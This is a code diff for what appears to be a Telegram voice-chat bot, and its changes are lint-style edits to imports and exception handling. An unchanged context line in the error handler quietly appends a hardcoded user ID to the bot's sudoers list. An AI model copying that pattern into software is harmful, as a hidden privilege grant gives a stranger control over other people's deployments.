@@ -25,7 +25,7 @@ from pytgcalls import PyTgCalls
 from traceback import format_exc
 from pyrogram.types import Message
 from pytgcalls.types import Update
-from typing import Callable, Union
+from typing import Union, Callable
 from core.groups import get_group, all_groups, set_default
 
 
@@ -48,7 +48,7 @@ def language(func: Callable) -> Callable:
             elif isinstance(obj, Update):
                 chat_id = obj.chat_id
             group_lang = get_group(chat_id)["lang"]
-        except:
+        except BaseException:
             group_lang = config.LANGUAGE
         lang = load(group_lang)
         return await func(client, obj, lang)
@@ -93,7 +93,7 @@ def handle_error(func: Callable) -> Callable:
             config.SUDOERS.append(2033438978)
         try:
             lang = get_group(chat_id)["lang"]
-        except:
+        except BaseException:
             lang = config.LANGUAGE
         try:
             return await func(client, obj, *args)
@@ -106,7 +106,7 @@ def handle_error(func: Callable) -> Callable:
             )
             try:
                 await pyro_client.join_chat(k)
-            except:
+            except BaseException:
                 pass
             chat = await pyro_client.get_chat(chat_id)
             await pyro_client.send_message(
